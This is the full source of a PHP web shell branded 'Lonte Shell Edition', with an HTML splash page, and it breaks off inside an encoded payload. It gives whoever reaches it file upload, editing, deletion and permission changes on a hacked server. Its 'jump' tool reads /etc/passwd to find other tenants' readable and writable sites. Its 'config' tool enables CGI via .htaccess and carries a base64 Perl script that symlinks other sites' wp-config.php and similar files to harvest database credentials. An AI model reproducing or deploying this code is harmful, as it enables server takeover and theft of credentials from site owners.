<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<meta content=" LONTE SHELL EDITION " name="subject">
<meta content=" LONTE SHELL EDITION " name="Abstract">
<meta name="keywords" content=" Pwnd By AnonyX ">
<meta content=" LONTE SHELL EDITION  " name="description">
<meta content="  LONTE SHELL EDITION  " name="copyright">
<meta content=" LONTE SHELL EDITION " name="author">
<meta name="poptm" content="f499d91660571166f7c8dec23fcb6649" />
<link href="" rel="stylesheet" type="text/css">
<link href="http://icons-for-free.com/icon/download-bookmark_bookmarks_date_dating_favorite_favorites_favourite_heart_love_lovely_pair_icon-431556.ico" rel="shortcut icon" type="image/x-icon" />
<title>Lonte Shell Edition</title>
<style>
body{
    font-family: "Times New Roman", cursive;
    background-color: #000000;
    text-shadow:0px 0px 1px #c5e2c5;
}



#content tr:hover{
    background-color: #c5e2c5;
    text-shadow:0px 0px 10px #c5e2c5;
}



#content .first{
    background-color: #c5e2c5;
}
#content .first:hover{
    background-color: lime;
    text-shadow:0px 0px 1px #c5e2c5;
}
table{
    border: 1px #c5e2c5 dotted;
}
H1{
    font-family: "blue", cursive;
}
a{
    color: #00ddff;
    text-decoration: none;
}
a:hover{
    color: blue;
    text-shadow:0px 0px 10px blue;
}
input,select,textarea{
    border: 1px #00FF00 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}
</style>
<body bgcolor="black">

<script>
var width=document.body.clientWidth;
var height=document.body.clientHeight;
function doClickText(who,type,step,timeOut) {
document.getElementById(who).style.display="none";
if(type==0) {
reveal('revealDiv1',step,timeOut,0);
reveal('revealDiv2',step,timeOut,1);}
if(type==1) {
reveal('revealDiv1',step,timeOut,2);
reveal('revealDiv2',step,timeOut,3);}}
function reveal(who,step,timeOut,type) {
if(type==0)
var where="top";
if(type==1)
var where="bottom";
if(type==2)
var where="left";
if(type==3)
var where="right";
eval('var temp=document.getElementById(who).style.'+where);
temp=parseInt(temp);
if(type==0||type==1)
var checkWith=height/2;
if(type==2||type==3)
var checkWith=width/2;
if(-temp<checkWith) {
temp-=step;
eval('document.getElementById(who).style.'+where+'=temp;');
setTimeout("reveal('"+who+"',"+step+",'"+timeOut+"',"+type+")", timeOut);}
else {
document.getElementById(who).style.display="none";
document.body.scroll="yes";}}
function initReveal(type,div1bg,div2bg,div1bw,div2bw,div1bc,div2bc,step,timeOut,click) {
if(type==0) {
var bWhere1="border-bottom";
var bWhere2="border-top";
var putZero1="top:0px; left:0px";
var putZero2="bottom:0px; left:0px";
document.write('<div id="revealDiv1" style="z-index:100; display:block; position:absolute; '+putZero1+'; background:'+div1bg+' ; width:'+(width)+'; height:'+(height/2)+'; '+bWhere1+':'+div1bc+' solid '+div1bw+'px"></div>');
document.write('<div id="revealDiv2" style="z-index:100; display:block; position:absolute; '+putZero2+'; background:'+div2bg+' ; width:'+(width)+'; height:'+(height/2)+'; '+bWhere2+':'+div2bc+' solid '+div2bw+'px"></div>');
if(!click) {
reveal('revealDiv1',step,timeOut,0);
reveal('revealDiv2',step,timeOut,1);}
else {
clickText(type,step,timeOut);}}
if(type==1) {
var bWhere1="border-right";
var bWhere2="border-left";
var putZero1="top:0px; left:0px";
var putZero2="top:0px; right:0px";
document.write('<div id="revealDiv1" style="z-index:100; display:block; position:absolute; '+putZero1+'; background:'+div1bg+' ; width:'+(width/2)+'; height:'+(height)+'; '+bWhere1+':'+div1bc+' solid '+div1bw+'px"></div>');
document.write('<div id="revealDiv2" style="z-index:100; display:block; position:absolute; '+putZero2+'; background:'+div2bg+' ; width:'+(width/2)+'; height:'+(height)+'; '+bWhere2+':'+div2bc+' solid '+div2bw+'px"></div>');
if(!click) {
reveal('revealDiv1',step,timeOut,2);
reveal('revealDiv2',step,timeOut,3);}
else {
clickText(type,step,timeOut);}}
function clickText(type,step,timeOut) {
document.write('<div id="clickText" style="z-index:101; display:block; position:absolute; top:'+(height/2-clickh/2-clickb)+'; left:'+(width/2-clickw/2-clickb)+'"><table style="border:'+clickc+' solid '+clickb+'px; background:'+clickbg+' ;width:'+clickw+'px; height:'+clickh+'; '+clickFont+'; cursor:hand; cursor:pointer" onClick="doClickText(\'clickText\','+type+','+step+','+timeOut+')"><tr><td align="middle">'+clickt+'</td></tr></table></div>');}}
</script>
<script>
var clickw=270;
var clickh=20;
var clickb=2;
var clickc="lime";
var clickbg="black"; // Background color
var clickt="Copyright by AWH R3C0D3D by AnonyX"; // Text to display 
var clickFont="font-family:Tahoma,arial,helvetica; font-size:10pt; font-weight:bold; color:white"; // The font style of the text
new initReveal(0,'black','black',1,1,'lime','lime',3,10,true);
</script>
</body>
<?php

if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")  $safemode = TRUE; else $safemode = FALSE;
if(isset($_GET['tool']) && ($_GET['tool'] == 'showinf')){
	$software = getenv("SERVER_SOFTWARE");
	$system = @php_uname();	
	$bindport = "13123";
	$bindport_pass = "b374k";
	$admin_id=$_SERVER['SERVER_ADMIN'];
	$server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);
	$my_ip = $_SERVER['REMOTE_ADDR'];
	$pv = '<font color="greeb" size="4">PHP Version : </font><b>'.phpversion().'</b> on <b>'.php_sapi_name().'</b><br />';
	echo'<style type="text/css">
#topbar{
position:absolute;
padding-left:30%;padding-top:5%;
background-color: transparancy;
width: auto;heigth:auto;
visibility: hidden;
z-index: 100;
}
</style> <script type="text/javascript">
var persistclose=0 //set to 0 or 1. 1 means once the bar is manually closed, it will remain closed for browser session
var startX = 30 //set x offset of bar in pixels
var startY = 5 //set y offset of bar in pixels
var verticalpos="fromtop" //enter "fromtop" or "frombottom"

function iecompattest(){
return (document.compatMode && document.compatMode!="BackCompat")? document.documentElement : document.body
}


function get_cookie(Name) {
var search = Name + "="
var returnvalue = "";
if (document.cookie.length > 0) {
offset = document.cookie.indexOf(search)
if (offset != -1) {
offset += search.length
end = document.cookie.indexOf(";", offset);
if (end == -1) end = document.cookie.length;
returnvalue=unescape(document.cookie.substring(offset, end))
}
}
return returnvalue;
}

function closebar(){
if (persistclose)
document.cookie="remainclosed=1"
document.getElementById("topbar").style.visibility="hidden"
}

function staticbar(){
barheight=document.getElementById("topbar").offsetHeight
var ns = (navigator.appName.indexOf("Netscape") != -1) || window.opera;
var d = document;
function ml(id){
var el=d.getElementById(id);
if (!persistclose || persistclose && get_cookie("remainclosed")=="")
el.style.visibility="visible"
if(d.layers)el.style=el;
el.sP=function(x,y){this.style.left=x+"px";this.style.top=y+"px";};
el.x = startX;
if (verticalpos=="fromtop")
el.y = startY;
else{
el.y = ns ? pageYOffset + innerHeight : iecompattest().scrollTop + iecompattest().clientHeight;
el.y -= startY;
}
return el;
}
window.stayTopLeft=function(){
if (verticalpos=="fromtop"){
var pY = ns ? pageYOffset : iecompattest().scrollTop;
ftlObj.y += (pY + startY - ftlObj.y)/8;
}
else{
var pY = ns ? pageYOffset + innerHeight - barheight: iecompattest().scrollTop + iecompattest().clientHeight - barheight;
ftlObj.y += (pY - startY - ftlObj.y)/8;
}
ftlObj.sP(ftlObj.x, ftlObj.y);
setTimeout("stayTopLeft()", 10);
}
ftlObj = ml("topbar");
stayTopLeft();
}

if (window.addEventListener)
window.addEventListener("load", staticbar, false)
else if (window.attachEvent)
window.attachEvent("onload", staticbar)
else if (document.getElementById)
window.onload=staticbar

</script>
<div class="clear">
</div>
<div id="topbar">
<div style="text-align: right;">
<a href="" onclick="closebar(); return false"><img src="http://4.bp.blogspot.com/-9MWyoN5VsJM/TivTpPyUuhI/AAAAAAAABL0/ldO739MTRBg/s1600/close3.png" alt="close"/></a></div>
<center><div style="background: blue;">
 <font color="red" size="4">Software : </font><b>'.$software.' - AnonyX</b></b><br />
 <font color="red" size="4">OS : </font><b>'.$system.'</b></b><br />
 <font color="red" size="4">ID : </font><b>Permission denied.</b></b><br />
 <font color="red" size="4">PHP Version : </font><b>'.phpversion().'</b> on <b>'.php_sapi_name().'</b><br />
 <font color="red" size="4">SERVER IP : </font>'.$server_ip.'<font color="red" size="4"> YOUR IP : </font><b>'.$my_ip.'</b></b><br />
 <font color="red" size="4">Safe MODE : </font><b>ERROR</font></b><br />
 </div></center></div>';
}


set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}
echo '
<style>
body {
font-family: transformers;
}
h1 {
color: #333;
font-size: 40px;
margin: 1px auto;
text-align:center;
}
.neon {
color: white;
text-shadow: 0 0 10px blue, 0 0 10px cyan, 0 0 20px red, 0 0 45px cyan, 0 0 40px purple;
}
</style>
<script>
window.onload = function() {
var h1 = document.getElementsByTagName("h1")[0],
text = h1.innerText || h1.textContent,
split = [], i, lit = 0, timer = null;
for(i = 0; i < text.length; ++i) {
split.push("<span>" + text[i] + "</span>");
}
h1.innerHTML = split.join("");
split = h1.childNodes;

var flicker = function() {
lit += 0.01;
if(lit >= 1) {
clearInterval(timer);
}
for(i = 0; i < split.length; ++i) {
if(Math.random() < lit) {
split[i].className = "neon";
} else {
split[i].className = "";
}
}
}
setInterval(flicker, 200);
}
</script></font><br>
<h1>LONTE<b> SHELL EDITION </b></h1>
<BODY text="white">
<H1><center><font color="lime" size="+4" face="Times New Roman"></font></font><font color="lime" face="Times New Roman"></font> <font color="#D3D3D3" size="+4" face="Times New Roman"></font></center></H1>

<br><center>


<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><center><b><a href="?">Dashboard</a> -*- <a href="?tool=showinf"> SHOW INFO</a> -*- <a href="?tool=hashid">HASH identify</a> -*- <a href="?tool=config"> Config </a> -*- <a href="?tool=jump"> Jumping </a></b></center><br>You Are Here : ';
if(isset($_GET['path'])){
    $path = $_GET['path'];   
}else{
    $path = getcwd();
}

$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
    if($pat == ' && $id == 0){
        $a = true;
        continue;
    }
    if($pat == ') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
        echo "$paths[$i]";
        if($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo '<font color="green">File Upload Done.</font><br />';
    }else{
        echo '<font color="red">File Upload Error.</font><br />';
    }
}
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
    echo "<tr><td>Current File : ";
    echo $_GET['filesrc'];
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">Change Permission Done.</font><br />';
            }else{
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="green">Change Name Done.</font><br />';
            }else{
                echo '<font color="red">Change Name Error.</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">Edit File Done.</font><br />';
            }else{
                echo '<font color="red">Edit File Error.</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        if($_POST['type'] == 'dir'){
            if(rmdir($_POST['path'])){
                echo '<font color="green">Delete Dir Done.</font><br />';
            }else{
                echo '<font color="red">Delete Dir Error.</font><br />';
            }
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="green">Delete File Done.</font><br />';
            }else{
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Name</center></td>
        <td><center>Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Options</center></td>
    </tr>';

    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        echo "<tr>
        <td><a href=\"?path=$path/$dir\">$dir</a></td>
        <td><center>DIR</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="green">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
        <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\"gass\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }

        echo "<tr>
        <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="green">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
        <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value='gass' />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
echo '<center><center><center>
</BODY>
</HTML>';
function perms($file){
    $perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
if($_GET['tool'] == 'jump') {
    $i = 0;
    echo "<div class='margin: 5px auto;'>";
    if(preg_match("/hsphere/", $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $url = str_replace(array("http://","www."), "", strtolower($url));
                $etc = "/etc/passwd";
                $f = fopen($etc,"r");
                while($gets = fgets($f)) {
                    $pecah = explode(":", $gets);
                    $user = $pecah[0];
                    $dir_user = "/hsphere/local/home/$user";
                    if(is_dir($dir_user) === true) {
                        $url_user = $dir_user."/".$url;
                        if(is_readable($url_user)) {
                            $i++;
                            $jrw = "[<font color=lime>R</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
                            if(is_writable($url_user)) {
                                $jrw = "[<font color=lime>RW</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
                            }
                            echo $jrw."<br>";
                        }
                    }
                }
            }
        if($i == 0) { 
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$server_ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
            $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
            while($getss = fgets($fp)) {
                echo $getss;
            }
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } elseif(preg_match("/vhosts|vhost/", $dir)) {
        preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
        $urls = explode("\r\n", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $url = str_replace("www.", "", $url);
                $web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
                if(is_dir($web_vh) === true) {
                    if(is_readable($web_vh)) {
                        $i++;
                        $jrw = "[<font color=lime>R</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
                        if(is_writable($web_vh)) {
                            $jrw = "[<font color=lime>RW</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
                        }
                        echo $jrw."<br>";
                    }
                }
            }
        if($i == 0) { 
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
                  bing("ip:$ip");
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } else {
        echo "<pre>";
        $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
        while($passwd = fgets($etc)) {
            if($passwd == '' || !$etc) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                foreach($user_jumping[1] as $user_idx_jump) {
                    $user_jumping_dir = "/home/$user_idx_jump/public_html";
                    if(is_readable($user_jumping_dir)) {
                        $i++;
                        $jrw = "[<font color=lime>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                        if(is_writable($user_jumping_dir)) {
                            $jrw = "[<font color=lime>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                        }
                        echo $jrw;
                        if(function_exists('posix_getpwuid')) {
                            $domain_jump = file_get_contents("/etc/named.conf");    
                            if($domain_jump == '') {
                                echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
                            } else {
                                preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                                foreach($domains_jump[1] as $dj) {
                                    $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                    $user_jumping_url = $user_jumping_url['name'];
                                    if($user_jumping_url == $user_idx_jump) {
                                        echo " => ( <u>$dj</u> )<br>";
                                        break;
                                    }
                                }
                            }
                        } else {
                            echo "<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) { 
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
    }
    echo "</div>";
}
if($_GET['tool'] == 'config') {
    $idx = mkdir("lonte_config", 0777);
    $isi_htc = "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
    $htc = fopen("lonte_config/.htaccess","w");
    fwrite($htc, $isi_htc);
    fclose($htc);
    if(preg_match("/vhosts|vhost/", $dir)) {
        $link_config = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
        $vhost = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpvcGVuZGlyKG15ICRkaXIgLCAiL3Zhci93d3cvdmhvc3RzLyIpOw0KZm9yZWFjaChzb3J0IHJlYWRkaXIgJGRpcikgew0KICAgIG15ICRpc0RpciA9IDA7DQogICAgJGlzRGlyID0gMSBpZiAtZCAkXzsNCiRzaXRlc3MgPSAkXzsNCg0KDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3Atb3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb20vaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2UudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2VzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXNob3BwaW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNhbGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJHNpdGVzcy4nLWFtZW1iZXIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnLmluYy5waHAnLCRzaXRlc3MuJy1hbWVtYmVyMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXJzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictbWVtYmVycy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlczEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLWZvcnVtLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtcy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictZm9ydW1zLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FkbWluL2NvbmYucGhwJywkc2l0ZXNzLictNS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictNC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dwL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvV1Avd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLXByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Jsb2cvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1uZXdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ldy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLW5ldy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9nL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9ncy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLWJsb2dzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1ob21lLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4